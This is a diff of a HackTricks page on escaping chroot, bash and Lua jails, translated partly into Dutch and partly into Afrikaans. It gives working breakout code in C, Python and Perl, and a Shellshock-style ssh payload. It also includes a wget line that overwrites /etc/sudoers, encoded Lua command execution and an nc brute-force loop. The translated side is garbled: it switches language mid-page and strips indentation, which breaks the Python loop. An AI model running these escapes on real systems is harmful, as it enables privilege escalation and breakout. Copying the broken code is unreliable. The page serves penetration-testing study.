@@ -1,46 +1,45 @@
-# Escaping from Jails
+# Ontsnapping uit Gevangenisse
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere manieren om HackTricks te ondersteunen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks wilt downloaden in PDF**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
+* Koop de [**officiële PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
+* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
 
 ## **GTFOBins**
 
-**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
+**Zoek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of je een binair bestand kunt uitvoeren met de eigenschap "Shell"**
 
-## Chroot Escapes
+## Ontsnapping uit Chroot
 
-From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
-Usually this means that to escape you need to be root inside the chroot.
+Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Het chroot-mechanisme is **niet bedoeld** om te beschermen tegen opzettelijke manipulatie door **bevoorrechte** (**root**) **gebruikers**. Op de meeste systemen worden chroot-contexten niet correct gestapeld en kunnen gechroote programma's **met voldoende privileges een tweede chroot uitvoeren om te ontsnappen**.\
+Meestal betekent dit dat je root moet zijn binnen de chroot om te ontsnappen.
 
 {% hint style="success" %}
-The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
+De **tool** [**chw00t**](https://github.com/earthquake/chw00t) is gemaakt om misbruik te maken van de volgende scenario's en te ontsnappen uit `chroot`.
 {% endhint %}
 
 ### Root + CWD
 
 {% hint style="warning" %}
-If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
+Als je **root** bent binnen een chroot, kun je ontsnappen door een **andere chroot** te maken. Dit komt doordat 2 chroots niet naast elkaar kunnen bestaan (in Linux), dus als je een map maakt en vervolgens een **nieuwe chroot** maakt in die nieuwe map terwijl je **buiten de chroot** bent, bevind je je nu **buiten de nieuwe chroot** en ben je dus in het bestandssysteem.
 
-This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
+Dit gebeurt omdat chroot meestal je werkmap niet verplaatst naar de aangegeven map, dus je kunt een chroot maken maar er buiten blijven.
 {% endhint %}
 
-Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
+Meestal vind je het `chroot`-binair bestand niet binnen een chroot-gevangenis, maar je **kunt een binair bestand compileren, uploaden en uitvoeren**:
 
 <details>
 
 <summary>C: break_chroot.c</summary>
-
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -50,62 +49,56 @@ Usually you won't find the `chroot` binary inside a chroot jail, but you **could
 
 int main(void)
 {
-    mkdir("chroot-dir", 0755);
-    chroot("chroot-dir");
-    for(int i = 0; i < 1000; i++) {
-        chdir("..");
-    }
-    chroot(".");
-    system("/bin/bash");
+mkdir("chroot-dir", 0755);
+chroot("chroot-dir");
+for(int i = 0; i < 1000; i++) {
+chdir("..");
+}
+chroot(".");
+system("/bin/bash");
 }
 ```
-
 </details>
 
 <details>
 
 <summary>Python</summary>
-
 ```python
 #!/usr/bin/python
 import os
 os.mkdir("chroot-dir")
 os.chroot("chroot-dir")
 for i in range(1000):
-    os.chdir("..")
+os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
 ```
-
 </details>
 
 <details>
 
 <summary>Perl</summary>
-
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
 chroot "chroot-dir";
 foreach my $i (0..1000) {
-    chdir ".."
+chdir ".."
 }
 chroot ".";
 system("/bin/bash");
 ```
-
 </details>
 
-### Root + Saved fd
+### Root + Opgeslagen fd
 
 {% hint style="warning" %}
-This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.
+Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n lêerbeskrywer na die huidige gids** en skep dan die chroot in 'n nuwe gids. Uiteindelik, omdat hy **toegang** het tot daardie **FD buite** die chroot, het hy toegang daartoe en **ontsnap** hy.
 {% endhint %}
 
 <details>
 
 <summary>C: break_chroot.c</summary>
-
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -115,71 +108,69 @@ This is similar to the previous case, but in this case the **attacker stores a f
 
 int main(void)
 {
-    mkdir("tmpdir", 0755);
-    dir_fd = open(".", O_RDONLY);
-    if(chroot("tmpdir")){
-        perror("chroot");
-    }
-    fchdir(dir_fd);
-    close(dir_fd);  
-    for(x = 0; x < 1000; x++) chdir("..");
-    chroot(".");
+mkdir("tmpdir", 0755);
+dir_fd = open(".", O_RDONLY);
+if(chroot("tmpdir")){
+perror("chroot");
+}
+fchdir(dir_fd);
+close(dir_fd);
+for(x = 0; x < 1000; x++) chdir("..");
+chroot(".");
 }
 ```
-
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 {% hint style="warning" %}
-FD can be passed over Unix Domain Sockets, so:
+FD kan oorgedra word oor Unix Domain Sockets, so:
 
-* Create a child process (fork)
-* Create UDS so parent and child can talk
-* Run chroot in child process in a different folder
-* In parent proc, create a FD of a folder that is outside of new child proc chroot
-* Pass to child procc that FD using the UDS
-* Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
+* Skep 'n kinderproses (fork)
+* Skep UDS sodat ouer en kind kan kommunikeer
+* Voer chroot uit in kinderproses in 'n ander vouer
+* In ouer proses, skep 'n FD van 'n vouer wat buite die nuwe kinderproses se chroot is
+* Gee daardie FD aan die kinderproses deur die UDS te gebruik
+* Kindproses chdir na daardie FD, en omdat dit buite sy chroot is, sal hy die tronk ontsnap
 {% endhint %}
 
 ### &#x20;Root + Mount
 
 {% hint style="warning" %}
-* Mounting root device (/) into a directory inside the chroot
-* Chrooting into that directory
+* Monteer die roetetoestel (/) in 'n gids binne die chroot
+* Chroot in daardie gids
 
-This is possible in Linux
+Dit is moontlik in Linux
 {% endhint %}
 
 ### Root + /proc
 
 {% hint style="warning" %}
-* Mount procfs into a directory inside the chroot (if it isn't yet)
-* Look for a pid that has a different root/cwd entry, like: /proc/1/root
-* Chroot into that entry
+* Monteer procfs in 'n gids binne die chroot (as dit nog nie is nie)
+* Soek na 'n pid wat 'n verskillende roet/cwd inskrywing het, soos: /proc/1/root
+* Chroot in daardie inskrywing
 {% endhint %}
 
 ### Root(?) + Fork
 
 {% hint style="warning" %}
-* Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
-* From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
-* This children process will find himself outside of the chroot
+* Skep 'n Fork (kinderproses) en chroot in 'n ander vouer dieper in die FS en CD daarop
+* Vanuit die ouerproses, skuif die vouer waar die kinderproses in is na 'n vouer voor die chroot van die kinders
+* Hierdie kinderproses sal homself buite die chroot vind
 {% endhint %}
 
 ### ptrace
 
 {% hint style="warning" %}
-* Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
-* Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap\_sys\_ptrace)).
+* 'n Tyd gelede kon gebruikers hul eie prosesse vanuit 'n proses van hulself afkamp... maar dit is nie meer standaard moontlik nie
+* In elk geval, as dit moontlik is, kan jy ptrace in 'n proses doen en 'n shellcode daarin uitvoer ([sien hierdie voorbeeld](linux-capabilities.md#cap\_sys\_ptrace)).
 {% endhint %}
 
-## Bash Jails
+## Bash Tronke
 
-### Enumeration
+### Opname
 
-Get info about the jail:
-
+Kry inligting oor die tronk:
 ```bash
 echo $SHELL
 echo $PATH
@@ -187,105 +178,101 @@ env
 export
 pwd
 ```
+### Wysig PATH
 
-### Modify PATH
-
-Check if you can modify the PATH env variable
-
+Kyk of jy die PATH-omgewingsveranderlike kan wysig.
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
+### Gebruik van vim
 
-### Using vim
+Vim is 'n kragtige teksredigeerder wat gebruik kan word om lêers te wysig en te skep. Dit kan ook gebruik word as 'n hulpmiddel vir priviligie-escalasie in 'n beperkte bash-omgewing.
 
+Om vim te gebruik, voer die volgende opdrag in die beperkte bash-omgewing in:
+
+```bash
+vim
+```
+
+Dit sal vim in die beperkte omgewing aktiveer. Jy kan dan die volgende stappe volg om priviligie-escalasie te probeer:
+
+1. Druk die `Esc`-sleutel om in die bevelsmodus te gaan.
+2. Tik `:set shell=/bin/bash` en druk `Enter` om die skulprigting van die shell te verander na die volledige bash-omgewing.
+3. Tik `:shell` en druk `Enter` om 'n nuwe bash-sessie te begin met volle toegang.
+
+Hierdie tegniek kan gebruik word om beperkte bash-omgewings te ontsnap en toegang te verkry tot volle beheer oor die stelsel.
 ```bash
 :set shell=/bin/sh
 :shell
 ```
+### Skep skrip
 
-### Create script
-
-Check if you can create an executable file with _/bin/bash_ as content
-
+Kyk of jy 'n uitvoerbare lêer met _/bin/bash_ as inhoud kan skep
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
+### Kry bash vanaf SSH
 
-### Get bash from SSH
-
-If you are accessing via ssh you can use this trick to execute a bash shell:
-
+As jy toegang verkry via ssh, kan jy hierdie truuk gebruik om 'n bash-skulp te hardloop:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-
-### Declare
-
+### Verklaar
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
- 
+
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-
 ### Wget
 
-You can overwrite for example sudoers file
-
+Jy kan byvoorbeeld die sudoers-lêer oorskryf.
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-
-### Other tricks
+### Ander truuks
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
 [https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
 [https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
-**It could also be interesting the page:**
+**Dit kan ook interessant wees die bladsy:**
 
 {% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
 [bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
 {% endcontent-ref %}
 
-## Python Jails
+## Python Tronke
 
-Tricks about escaping from python jails in the following page:
+Truuks oor ontsnapping uit python tronke op die volgende bladsy:
 
 {% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
 [bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-## Lua Jails
+## Lua Tronke
 
-In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+Op hierdie bladsy kan jy die globale funksies vind waarop jy toegang het binne lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
-**Eval with command execution:**
-
+**Eval met opdrag uitvoering:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-
-Some tricks to **call functions of a library without using dots**:
-
+Sommige truuks om **funksies van 'n biblioteek te roep sonder om punte te gebruik**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-
-Enumerate functions of a library:
-
+Enumerasie van funksies van 'n biblioteek:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-
-Note that every time you execute the previous one liner in a **different lua environment the order of the functions change**. Therefore if you need to execute one specific function you can perform a brute force attack loading different lua environments and calling the first function of le library:
-
+Let wel, elke keer as jy die vorige een-regel kode in 'n **verskillende lua-omgewing uitvoer, verander die volgorde van die funksies**. Daarom, as jy 'n spesifieke funksie wil uitvoer, kan jy 'n brute force-aanval uitvoer deur verskillende lua-omgewings te laai en die eerste funksie van die le-biblioteek aan te roep:
 ```bash
-#In this scenario you could BF the victim that is generating a new lua environment 
+#In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
 #the char function is going to be executed
 for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
@@ -294,27 +281,24 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-
-**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) calling:
-
+**Kry interaktiewe lua-skaal**: As jy binne 'n beperkte lua-skaal is, kan jy 'n nuwe lua-skaal (en hopelik onbeperkte) kry deur die volgende te roep:
 ```bash
 debug.debug()
 ```
+## Verwysings
 
-## References
-
-* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
+* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Dia's: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
